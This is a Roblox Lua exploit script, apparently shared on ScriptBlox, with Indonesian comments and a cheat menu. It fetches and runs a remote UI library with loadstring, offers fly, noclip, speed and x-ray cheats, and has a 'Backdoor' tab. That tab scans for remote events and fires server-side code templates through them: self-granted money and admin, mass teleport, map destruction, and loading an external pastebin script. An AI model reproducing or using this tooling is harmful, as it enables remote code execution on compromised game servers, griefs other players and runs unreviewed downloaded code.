--[[
WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]

-- XKID AESTHETIC v4.0 - FLY FIXED + BACKDOOR AUTO
-- Fitur: Fly Superman (PASTI GERAK) + Backdoor 1 Klik

Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Vovabro46/trash/refs/heads/main/Aurora.lua"))()

-- ============================================
-- SERVICES
-- ============================================
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Workspace = game:GetService("Workspace")
local RS = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Lighting = game:GetService("Lighting")
local VirtualUser = game:GetService("VirtualUser")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")

-- ============================================
-- WINDOW AESTHETIC
-- ============================================
local Win = Library:Window(
    "✨ XKID AESTHETIC v4.0", 
    "sparkles", 
    "Fly Fixed | Backdoor Auto", 
    false
)

-- ============================================
-- TAB MENU
-- ============================================
Win:TabSection("🦸 MOVEMENT")
local MoveTab = Win:Tab("Movement", "wind")

Win:TabSection("👁️ VISUAL")
local VisualTab = Win:Tab("Visuals", "sparkles")

Win:TabSection("💀 BACKDOOR")
local BackdoorTab = Win:Tab("Backdoor", "skull")

Win:TabSection("🎨 UTILITY")
local UtilTab = Win:Tab("Utility", "heart")

-- ============================================
-- VARIABEL GLOBAL
-- ============================================
-- Movement
local noclip = false
local noclipConn = nil
local fly = false
local flyConn = nil
local flyVel = nil
local flyGyro = nil
local flySpeed = 50
local infJump = false
local speed = 16
local jump = 50

-- Backdoor
local backdoorList = {}
local selectedBackdoor = nil

-- ============================================
-- FLY SUPERMAN - FIXED VERSION (PASTI GERAK)
-- ============================================
local function toggleFly(state)
    fly = state
    
    -- Cleanup
    if flyConn then flyConn:Disconnect(); flyConn = nil end
    if flyVel then flyVel:Destroy(); flyVel = nil end
    if flyGyro then flyGyro:Destroy(); flyGyro = nil end
    
    if state and LocalPlayer.Character then
        local root = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        local humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        
        if root and humanoid then
            -- Set humanoid ke mode terbang
            humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying, true)
            humanoid:ChangeState(Enum.HumanoidStateType.Flying)
            humanoid.PlatformStand = false
            
            -- BodyVelocity untuk gerak
            flyVel = Instance.new("BodyVelocity")
            flyVel.Velocity = Vector3.new(0, 0, 0)
            flyVel.MaxForce = Vector3.new(5000, 5000, 5000)
            flyVel.Parent = root
            
            -- BodyGyro untuk stabilisasi
            flyGyro = Instance.new("BodyGyro")
            flyGyro.MaxTorque = Vector3.new(5000, 5000, 5000)
            flyGyro.P = 1000
            flyGyro.D = 50
            flyGyro.CFrame = root.CFrame
            flyGyro.Parent = root
            
            -- Loop gerak
            flyConn = RunService.Heartbeat:Connect(function()
                if not fly or not LocalPlayer.Character then return end
                if not root or not root.Parent then return end
                
                local move = Vector3.new()
                local cam = Workspace.CurrentCamera
                
                -- WASD untuk gerak maju/mundur/kiri/kanan (relatif kamera)
                if UIS:IsKeyDown(Enum.KeyCode.W) then
                    move = move + cam.CFrame.LookVector
                end
                if UIS:IsKeyDown(Enum.KeyCode.S) then
                    move = move - cam.CFrame.LookVector
                end
                if UIS:IsKeyDown(Enum.KeyCode.A) then
                    move = move - cam.CFrame.RightVector
                end
                if UIS:IsKeyDown(Enum.KeyCode.D) then
                    move = move + cam.CFrame.RightVector
                end
                
                -- Spasi & Ctrl untuk naik/turun
                if UIS:IsKeyDown(Enum.KeyCode.Space) then
                    move = move + Vector3.new(0, 1, 0)
                end
                if UIS:IsKeyDown(Enum.KeyCode.LeftControl) then
                    move = move - Vector3.new(0, 1, 0)
                end
                
                -- Terapkan kecepatan
                if move.Magnitude > 0 then
                    flyVel.Velocity = move.Unit * flySpeed
                    -- Hadapkan ke arah gerak
                    flyGyro.CFrame = CFrame.lookAt(root.Position, root.Position + move.Unit)
                else
                    flyVel.Velocity = Vector3.new(0, 0, 0)
                    flyGyro.CFrame = root.CFrame
                end
            end)
            
            Library:Notification("Fly", "Superman mode ON! 🦸 Speed: "..flySpeed, 3)
        end
    else
        if LocalPlayer.Character then
            local humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
            if humanoid then
                humanoid:ChangeState(Enum.HumanoidStateType.Landing)
                humanoid.PlatformStand = false
            end
        end
        Library:Notification("Fly", "OFF", 2)
    end
end

-- ============================================
-- BACKDOOR AUTO (TANPA KODE)
-- ============================================
local function scanBackdoor()
    backdoorList = {}
    local patterns = {
        "Admin", "Backdoor", "Server", "Execute", "Run", 
        "Command", "Control", "Exploit", "Load", "Eval"
    }
    
    print("\n" .. string.rep("=", 50))
    print("🔍 BACKDOOR SCAN RESULTS")
    print(string.rep("=", 50))
    
    -- Scan di ReplicatedStorage
    for _, v in pairs(RS:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            for _, pattern in ipairs(patterns) do
                if v.Name:find(pattern, 1, true) then
                    table.insert(backdoorList, {
                        Name = v.Name,
                        Path = "ReplicatedStorage." .. v.Name,
                        Type = v.ClassName,
                        Object = v,
                        Confidence = "Tinggi"
                    })
                    print(string.format("[✅] %s - %s", v.ClassName, v.Name))
                    break
                end
            end
        end
    end
    
    -- Scan di Workspace
    for _, v in pairs(Workspace:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            for _, pattern in ipairs(patterns) do
                if v.Name:find(pattern, 1, true) then
                    table.insert(backdoorList, {
                        Name = v.Name,
                        Path = "Workspace." .. v.Name,
                        Type = v.ClassName,
                        Object = v,
                        Confidence = "Tinggi"
                    })
                    print(string.format("[✅] %s - %s", v.ClassName, v.Name))
                    break
                end
            end
        end
    end
    
    Library:Notification("Backdoor", string.format("Ditemukan %d backdoor potensial", #backdoorList), 5)
    return backdoorList
end

-- Template kode siap pakai untuk backdoor
local backdoorTemplates = {
    {
        Name = "💰 Kasih Uang ke Diri Sendiri",
        Code = [[
local player = game.Players.LocalPlayer
local remote = game:ReplicatedStorage:FindFirstChild("GiveMoney") or game:ReplicatedStorage:FindFirstChild("AddCoins")
if remote then
    remote:FireServer(player, 999999)
end
print("Uang diberikan!")
]]
    },
    {
        Name = "👑 Jadi Admin",
        Code = [[
local player = game.Players.LocalPlayer
local remote = game:ReplicatedStorage:FindFirstChild("MakeAdmin") or game:ReplicatedStorage:FindFirstChild("SetAdmin")
if remote then
    remote:FireServer(player)
end
print("Admin activated!")
]]
    },
    {
        Name = "💎 Kasih Semua Orang Item",
        Code = [[
local itemName = "Diamond"
local remote = game:ReplicatedStorage:FindFirstChild("GiveItem") or game:ReplicatedStorage:FindFirstChild("AddItem")
if remote then
    for _, player in pairs(game.Players:GetPlayers()) do
        remote:FireServer(player, itemName, 100)
    end
end
print("Item diberikan ke semua orang!")
]]
    },
    {
        Name = "🌍 Teleport Semua Orang ke Saya",
        Code = [[
local myPos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
for _, player in pairs(game.Players:GetPlayers()) do
    if player.Character then
        player.Character.HumanoidRootPart.CFrame = CFrame.new(myPos)
    end
end
print("Semua player ditarik!")
]]
    },
    {
        Name = "💥 Hancurkan Map",
        Code = [[
for _, v in pairs(workspace:GetDescendants()) do
    if v:IsA("BasePart") then
        v:Destroy()
    end
end
print("Map dihancurkan!")
]]
    },
    {
        Name = "📦 Load Script External",
        Code = [[
loadstring(game:HttpGet("https://pastebin.com/raw/xxx"))()
print("Script loaded!")
]]
    },
    {
        Name = "⚡ Speed Server (Semua Orang)",
        Code = [[
local speed = 100
for _, player in pairs(game.Players:GetPlayers()) do
    if player.Character then
        local hum = player.Character:FindFirstChildOfClass("Humanoid")
        if hum then
            hum.WalkSpeed = speed
        end
    end
end
print("Speed semua player diubah!")
]]
    }
}

-- ============================================
-- MOVEMENT TAB
-- ============================================
local MovePage = MoveTab:Page("Movement", "wind")
local MoveLeft = MovePage:Section("🦸 Fly Controls", "Left")
local MoveRight = MovePage:Section("⚡ Basic", "Right")

-- FLY TOGGLE (SUDAH FIX)
MoveLeft:Toggle("🦸 Fly Superman", "FlyToggle", false, "Terbang bebas (WASD + Spasi/Ctrl)", function(state)
    toggleFly(state)
end)

-- Slider Kecepatan Fly
MoveLeft:Slider("🚀 Fly Speed", "FlySpeedSlider", 10, 200, 50, function(val)
    flySpeed = val
    if fly then
        Library:Notification("Fly Speed", tostring(val), 1)
    end
end, "Kecepatan terbang")

-- Noclip
MoveRight:Toggle("Noclip", "NoclipToggle", false, "Tembus dinding", function(state)
    noclip = state
    if noclipConn then noclipConn:Disconnect() end
    if state then
        noclipConn = RunService.Stepped:Connect(function()
            if LocalPlayer.Character then
                for _, part in pairs(LocalPlayer.Character:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.CanCollide = false
                    end
                end
            end
        end)
    end
end)

-- Speed Slider
MoveRight:Slider("Walk Speed", "SpeedSlider", 16, 500, 16, function(val)
    speed = val
    if LocalPlayer.Character then
        local hum = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if hum then hum.WalkSpeed = val end
    end
end)

-- Jump Slider
MoveRight:Slider("Jump Power", "JumpSlider", 50, 500, 50, function(val)
    jump = val
    if LocalPlayer.Character then
        local hum = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if hum then hum.JumpPower = val end
    end
end)

-- Infinite Jump
MoveRight:Toggle("Infinite Jump", "InfJumpToggle", false, "Lompat di udara", function(state)
    infJump = state
    if state then
        UIS.JumpRequest:Connect(function()
            if infJump and LocalPlayer.Character then
                local hum = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                if hum then hum:ChangeState(Enum.HumanoidStateType.Jumping) end
            end
        end)
    end
end)

-- ============================================
-- BACKDOOR TAB (AUTO - TANPA KODE)
-- ============================================
local BackdoorPage = BackdoorTab:Page("Backdoor Tools", "skull")
local BackdoorLeft = BackdoorPage:Section("🔍 Scanner", "Left")
local BackdoorRight = BackdoorPage:Section("💀 Auto Execute", "Right")

-- Scan Backdoor
BackdoorLeft:Button("🔍 Scan Backdoor Sekarang", "Cari remote mencurigakan", function()
    scanBackdoor()
end)

-- Dropdown Pilih Backdoor
BackdoorLeft:Dropdown("Pilih Backdoor", "BackdoorDropdown", {"Scan dulu!"}, function(val)
    for _, bd in ipairs(backdoorList) do
        if bd.Name == val then
            selectedBackdoor = bd
            Library:Notification("Dipilih", bd.Name, 2)
            break
        end
    end
end, "Pilih backdoor yang akan digunakan")

-- Auto Execute Templates (TANPA KODE)
BackdoorRight:Paragraph("💀 Template Exploit", "Klik salah satu untuk execute:")

for i, template in ipairs(backdoorTemplates) do
    BackdoorRight:Button(template.Name, "Execute template ini", function()
        if not selectedBackdoor and #backdoorList > 0 then
            selectedBackdoor = backdoorList[1]
        end
        
        if not selectedBackdoor then
            Library:Notification("Error", "Scan backdoor dulu!", 3)
            return
        end
        
        local success = pcall(function()
            if selectedBackdoor.Object:IsA("RemoteEvent") then
                selectedBackdoor.Object:FireServer(template.Code)
            else
                selectedBackdoor.Object:InvokeServer(template.Code)
            end
            Library:Notification("Sukses", "Template dieksekusi via " .. selectedBackdoor.Name, 3)
        end)
        
        if not success then
            Library:Notification("Gagal", "Backdoor mungkin tidak valid", 3)
        end
    end)
end

-- ============================================
-- VISUAL TAB
-- ============================================
local VisPage = VisualTab:Page("Visual", "sparkles")
local VisLeft = VisPage:Section("✨ Effects", "Left")

VisLeft:Toggle("Fullbright", "FullbrightToggle", false, "Terang seperti siang", function(state)
    if state then
        Lighting.Brightness = 2
        Lighting.ClockTime = 14
        Lighting.FogEnd = 100000
        Lighting.GlobalShadows = false
    else
        Lighting.Brightness = 1
        Lighting.ClockTime = 12
        Lighting.FogEnd = 50000
        Lighting.GlobalShadows = true
    end
end)

VisLeft:Toggle("X-Ray Vision", "XRayToggle", false, "Lihat tembus dinding", function(state)
    for _, part in pairs(Workspace:GetDescendants()) do
        if part:IsA("BasePart") then
            part.LocalTransparencyModifier = state and 0.7 or 0
        end
    end
end)

VisLeft:Slider("Field of View", "FOVSlider", 40, 120, 70, function(val)
    Workspace.CurrentCamera.FieldOfView = val
end)

-- ============================================
-- UTILITY TAB
-- ============================================
local UtilPage = UtilTab:Page("Utility", "heart")
local UtilLeft = UtilPage:Section("🛠 Tools", "Left")

UtilLeft:Toggle("Anti AFK", "AntiAFKToggle", false, "Cegah disconnect", function(state)
    if state then
        LocalPlayer.Idled:Connect(function()
            VirtualUser:CaptureController()
            VirtualUser:ClickButton2(Vector2.new())
        end)
    end
end)

UtilLeft:Button("📍 Teleport ke Mouse", "Pindah ke posisi kursor", function()
    local mouse = LocalPlayer:GetMouse()
    if mouse and mouse.Hit and LocalPlayer.Character then
        LocalPlayer.Character:SetPrimaryPartCFrame(mouse.Hit + Vector3.new(0, 3, 0))
    end
end)

UtilLeft:Button("🔄 Rejoin Server", "Koneksi ulang", function()
    TeleportService:Teleport(game.PlaceId, LocalPlayer)
end)

UtilLeft:Button("🌐 Server Hop", "Cari server lain", function()
    local success, servers = pcall(function()
        local res = game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?limit=100")
        return HttpService:JSONDecode(res)
    end)
    
    if success and servers and servers.data then
        for _, server in ipairs(servers.data) do
            if server.playing < server.maxPlayers and server.id ~= game.JobId then
                TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id, LocalPlayer)
                return
            end
        end
    end
end)

-- ============================================
-- INIT
-- ============================================
Library:Notification("XKID AESTHETIC v4.0", "Fly Fixed + Backdoor Auto! 🚀", 5)
Library:ConfigSystem(Win)

print("╔══════════════════════════════════════════╗")
print("║   ✨ XKID AESTHETIC v4.0                ║")
print("║   Fly Superman: ✅ FIXED                ║")
print("║   Backdoor Auto: ✅ TANPA KODE          ║")
print("╚══════════════════════════════════════════╝")